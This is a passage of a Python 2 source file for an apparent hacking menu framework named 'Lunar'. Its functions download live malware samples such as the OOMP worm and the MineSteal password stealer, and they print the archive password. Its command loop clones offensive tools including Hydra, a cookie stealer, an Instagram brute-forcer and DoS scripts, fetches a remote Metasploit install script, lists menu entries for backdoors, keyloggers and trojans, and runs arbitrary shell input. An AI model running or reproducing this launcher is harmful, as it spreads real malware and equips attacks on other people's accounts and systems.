        print(color.GREEN + '[+] '+color.CWHITE + 'Password to zip file is: '+color.YELLOW+'infect3d')
        print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'https://objective-see.com/downloads/malware/OOMP%20(Leap).zip'
        resp = urllib2.urlopen(url)
        with open('OOMP (Leap)','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (worm)      
{1}└──>{0} Virus Name: {3} (OOMP (Leap))
{1}└──>{0} Virus Info: {3} http://www.ambrosiasw.com/forums/index.php?showtopic=102379
{1}└──>{0} Virus Total: {3}https://www.virustotal.com/#/file/5448c05a8c0764d05519978dcedbff0c33dbfeeeb57c84166c131b878c8b4b6f/
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()

def mac_pass():
    try:
        print(color.GREEN + '[+] '+color.CWHITE + 'Password to zip file is: '+color.YELLOW+'infect3d')
        print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE + 'Downloading zip file')
        t.sleep(.5)
        url = 'https://objective-see.com/downloads/malware/MineSteal.zip'
        resp = urllib2.urlopen(url)
        with open('MineSteal.zip','wb') as output:
            output.write(resp.read())
        print color.CWHITE + '''
==========================================
{1}└──>{0} Virus Type: {3} (password stealer)      
{1}└──>{0} Virus Name: {3} (MineSteal)
{1}└──>{0} Virus Info: {3} https://www.intego.com/mac-security-blog/intego-discovers-a-new-multi-platform-minecraft-password-stealer/
{1}└──>{0} Virus Total: {3}https://www.virustotal.com/#/file/b07a8eb99c448c3981e5dcce5145e8feb99163ac74348a513a9002905346d166/    
{2}=========================================='''.decode('utf').format(color.BLUE, color.YELLOW, color.CWHITE, color.RED)
    except KeyboardInterrupt:
        main()
def KeyENCODE():
    try:
        key = Fernet.generate_key()
        f = Fernet(key)
        sentence_encode = raw_input(color.GREEN + '[+] '+color.CWHITE+'Enter a word / sentence to encode: ')
        token = f.encrypt(sentence_encode)
        print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE +token + '       (  token  )')
        print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE +key + '         (   KEY   )')
    except KeyboardInterrupt:
        main()
    except TypeError:
        ErrorLog('Message could not be encoded')
        
def encodeHEX():
    try:
        hex_input = raw_input(color.GREEN + '[+] '+color.CWHITE+'Enter a word to encode: ')
        hex_input = hex_input.encode('hex','strict')
        print (color.GREEN + ' └──> '.decode('utf') + color.CWHITE +hex_input)
    except KeyboardInterrupt:
        main()
    except TypeError:
        ErrorLog('Message could not be encoded')

def decodeHEX():
    try:
        hex_input = raw_input(color.GREEN + '[+] '+color.CWHITE+'Enter a word to decode: ')
        hex_input2 = hex_input.decode('hex','strict')
        print (color.GREEN+' └──> '+color.CWHITE+hex_input2).decode('utf')
    except TypeError:
        ErrorLog('Message could not be decoded')
        main()
    except KeyboardInterrupt:
        main()


def hashEncodemd5():
    try:
        hash_input = raw_input(color.GREEN + '[+] '+color.CWHITE+'Enter a word to encode: ')
        md5_encode = hashlib.md5(hash_input.encode()) 
        newhash = md5_encode.hexdigest()
        print (color.GREEN + ' └──> '.decode('utf') +color.CWHITE+ newhash)
    except KeyboardInterrupt:
        main()
    except TypeError:
        ErrorLog('Message could not be encoded')   

def hashEncodesha():
    try:
        hash_input = raw_input(color.GREEN + '[+] '+color.CWHITE+'Enter a word to encode: ')
        sha_encode = hashlib.sha256(hash_input.encode()) 
        newhash = sha_encode.hexdigest()
        print (color.GREEN + ' └──> '.decode('utf') +color.CWHITE+ newhash)
    except KeyboardInterrupt:
        main()
    except TypeError:
        ErrorLog('Message could not be encoded')

def hashEncodesha1():
    try:
        hash_input = raw_input(color.GREEN + '[+] '+color.CWHITE+'Enter a word to encode: ')
        sha_encode = hashlib.sha1(hash_input.encode()) 
        newhash = sha_encode.hexdigest()
        print (color.GREEN + ' └──> '.decode('utf') +color.CWHITE+ newhash)
    except KeyboardInterrupt:
        main()
    except TypeError:
        ErrorLog('Message could not be encoded')      

def hashEncodesha384():
    try:
        hash_input = raw_input(color.GREEN + '[+] '+color.CWHITE+'Enter a word to encode: ')
        sha_encode = hashlib.sha384(hash_input.encode()) 
        newhash = sha_encode.hexdigest()
        print (color.GREEN + ' └──> '.decode('utf') +color.CWHITE+ newhash)
    except KeyboardInterrupt:
        main()
    except TypeError:
        ErrorLog('Message could not be encoded')      


def hashEncodesha512():
    try:
        hash_input = raw_input(color.GREEN + '[+] '+color.CWHITE+'Enter a word to encode: ')
        sha_encode = hashlib.sha512(hash_input.encode()) 
        newhash = sha_encode.hexdigest()
        print (color.GREEN + ' └──> '.decode('utf') +color.CWHITE+ newhash)
    except KeyboardInterrupt:
        main()
    except TypeError:
        ErrorLog('Message could not be encoded')   

def showmac():
    try:
        subprocess.call(['getmac'])
    except OSError:
        os.system('ifconfig')
    main()

def showip():
    ip = socket.gethostbyname(socket.gethostname())
    print ip
    main()




# MAIN

def main():
    while True:
        global history
        try:
            option_framework = raw_input(color.BLUE + 'Lunar[>] '+color.CWHITE)
            history.append(option_framework)
            if option_framework.lower()  == '/':
                last_command = len(history)
                last_command -= 2
                option_framework = history[last_command]
            if option_framework == 'sesh':
                SuccessLog('Sesh till death :) ')
            if option_framework == 'arplisten':
                run_arp()
            if option_framework.lower() == 'port listen':
                listen()
            if option_framework.lower() == 'showip':
                showip()
            if option_framework.lower() == 'sourcecode':
                sourcecode()
            if option_framework.lower() == 'site2ip':
                site2ip()
            if option_framework.lower() == 'history':
                for h in history: print (h)
            if option_framework.lower()  == 'c-history':
                history = []
            if option_framework.lower()  == 'showmac':
                showmac()
            if option_framework.lower()  == 'key_encode':
                KeyENCODE()
            if option_framework.lower()  == 'key_decode':
                KeyDECODE()
            if option_framework.lower() == 'realpass12k':
                passlistREAL()
            if option_framework.lower() == 'darkweb2017':
                DarkWebpass()
            if option_framework.lower() == 'prob_wpa':
                wpapassreal()
            if option_framework.lower() == 'unknown-azul':
                unknownAzul()
            if option_framework.lower() == 'bt4_list':
                bt4password()
            if option_framework.lower() == 'cracked_hash':
                crackedhashes()
            if option_framework.lower() == 'eagle-eye':
                os.system('git clone   https://github.com/ThoughtfulDev/EagleEye')
            if option_framework.lower() == 'highjack':
                os.system('git clone https://github.com/chrisk44/Hijacker')
            if option_framework.lower() == 'mercury':
                os.system('git clone https://github.com/MetaChar/Mercury')
            if option_framework.lower() == 'devploit':
                os.system('git clone https://github.com/joker25000/Devploit')
            if option_framework.lower() == 'pureblood':
                os.system('git https://github.com/cr4shcod3/pureblood')
            if option_framework.lower() == 'inspector':
                os.system('git clone https://github.com/Moham3dRiahi/Th3inspector')
            if option_framework.lower() == 'badmod':
                os.system('git clone https://github.com/MrSqar-Ye/BadMod')
            if option_framework.lower() == 'Photon':
                os.system('git clone https://github.com/s0md3v/Photon')
            if option_framework.lower() == 'pyhawk':
                os.system('git clone https://github.com/MetaChar/pyHAWK')
            if option_framework.lower() == 'msf-down':
                os.system('wget Auxilus.github.io/metasploit.sh ')
            if option_framework.lower() == 'hammer':
                os.system('git clone https://github.com/cyweb/hammer')
            if option_framework.lower() == 'xerxes':
                os.system('git clone https://github.com/zanyarjamal/xerxes')
            if option_framework.lower() == 'aircrack' :
                os.system('git clone https://github.com/aircrack-ng/aircrack-ng')
            if option_framework.lower() == 'sqldown':
                os.system('git clone https://github.com/sqlmapproject/sqlmap')
            if option_framework.lower() == 'l-download':
                os.system('git clone https://github.com/arismelachroinos/lscript')
            if option_framework.lower() == 'f-society':
                os.system('git clone https://github.com/Manisso/fsociety')
            if option_framework.lower() == 'xss-strike':
                os.system('git clone https://github.com/UltimateHackers/XSStrike')
            if option_framework.lower() == 'wp-scan':
                os.system('git clone  https://github.com/wpscanteam/wpscan')
            if option_framework.lower() == 'cupp':
                os.system('git clone https://github.com/Mebus/cupp')
            if option_framework.lower() =='hydra-d':
                os.system('git clone https://github.com/vanhauser-thc/thc-hydra')
            if option_framework.lower() == 'https://github.com/derv82/wifite':
                os.system('git clone https://github.com/derv82/wifite')
            if option_framework.lower() =='instabrute':
                os.system('git clone https://github.com/N3TC4T/InstaBrute')
            if option_framework.lower() == 'reaver':
                os.system('git clone https://github.com/t6x/reaver-wps-fork-t6x')
            if option_framework.lower() == 'nmap-down':
                os.system('git clone https://github.com/nmap/nmap')
            if option_framework.lower() =='admin-pan':
                os.system('git clone https://github.com/bdblackhat/admin-panel-finder')
            if option_framework.lower() == 'credmap':
                os.system('git clone https://github.com/lightos/credmap')
            if option_framework.lower() == 'hacktronian':
                os.system('git clone https://github.com/thehackingsage/hacktronian')    
            if option_framework.lower() == 'gasmask':
                os.system('git clone https://github.com/twelvesec/gasmask')
            if option_framework.lower() == 'dedsploit':
                os.system('git clone https://github.com/ex0dus-0x/dedsploit')
            if option_framework.lower() == 'cookie-s':
                os.system('git clone https://github.com/Xyl2k/Cookie-stealer')
            if option_framework.lower() == 'killchain':
                os.system('git clone https://github.com/ruped24/killchain')
            if option_framework.lower() == 'banner':
                logo_pick = random.choice(logo_list)
                print logo_pick          
            if option_framework.lower() == 'help':
                print (help_mesg)
            if option_framework.lower()== 'msf':
                os.system('msfconsole')
            if option_framework.lower() == 'clear':
                os.system('clear')
            if option_framework.lower() == 'cls':
                os.system('cls') 
            if option_framework.lower() == 'hex_encode':
                encodeHEX()
            if option_framework.lower() == 'hash_md5':
                hashEncodemd5()
            if option_framework.lower() == 'hash_sha256':
                hashEncodesha()
            if option_framework.lower() == 'hash_sha1':
                hashEncodesha1()
            if option_framework.lower() == 'hash_sha512':
                hashEncodesha512()
            if option_framework.lower() == 'hash_sha384':
                hashEncodesha384()
            if option_framework.lower() == 'hex_decode':
                decodeHEX()
            if option_framework.lower() == 'geolocation':
                geolocation()
            if option_framework.lower() == 'reverse_ip':
                rev_ip()
            if option_framework.lower() == 'dns_lookup':
                dns_lookup()
            if option_framework.lower() == 'dns_host_rec':
                dns_host_records()
            if option_framework.lower() == 'shared_dns':
                findshareddns_servs()
            if option_framework.lower() == 'traceroute':
                trace()
            if option_framework.lower() == 'headers':
                headers()
            if option_framework.lower() == 'zonetransfer':
                zonetransfer()
            if option_framework.lower() == 'whois':
                whois_lookup()
            if option_framework.lower() == 'tcpscan':
                tcpscan()
            if option_framework.lower() == 'admin':
                admin()
            if option_framework.lower() == 'tools':
                print tools
            if option_framework.lower() == 'exit':
                    ErrorLog('Exiting\n')
                    log_file  = open(x+'/log.txt','a+')
                    global start_time
                    end_time = datetime.datetime.now()
                    time = '\n'+ str(start_time.hour) + ':' + str(start_time.minute) + ' => ' + str(end_time.hour) + ':' + str(end_time.minute)
                    log_file.write(time)
                    exit()
            if option_framework.lower() == 'mac_backdoor':
                mac_backdoor()
            if option_framework.lower() == 'mac_adware':
                mac_adware()
            if option_framework.lower() == 'mac_keylog':
                mac_keylog()
            if option_framework.lower() == 'mac_thief':
                mac_thief()
            if option_framework.lower() == 'mac_dropper':
                mac_dropper()
            if option_framework.lower() == 'mac_spyware':
                mac_spyware()
            if option_framework.lower() == 'mac_keylog':
                mac_keylog()
            if option_framework.lower() == 'mac_worm':
                mac_worm()
            if option_framework.lower() == 'mac_pass':
                mac_pass()
            if option_framework.lower() == 'win_fflash':
                win_fflash()
            if option_framework.lower() == 'win_bonzi':
                win_bonzi()
            if option_framework.lower() == 'win_memz':
                win_memz()
            if option_framework.lower() == 'win_phish':
                win_phishing()
            if option_framework.lower() == 'win_exploit':
                win_exploitkit() 
            if option_framework.lower() == 'win_trojan':
                win_trojan()
            if option_framework.lower() == 'hydra':
                hydra_brute()
            if option_framework.lower() == 'wireshark':
                wireshark()
            if option_framework.lower() == 'os':
                command = raw_input(color.GREEN + '[+] '+color.CWHITE + 'Enter a command: ')
                try:
                    os.system(command)
                except:
                    main()
            if option_framework.lower() == 'sublink':
                sublink()       
        except KeyboardInterrupt:
            ErrorLog('Exit using the command "exit"')



# Run
start_time = datetime.datetime.now()
platform_check()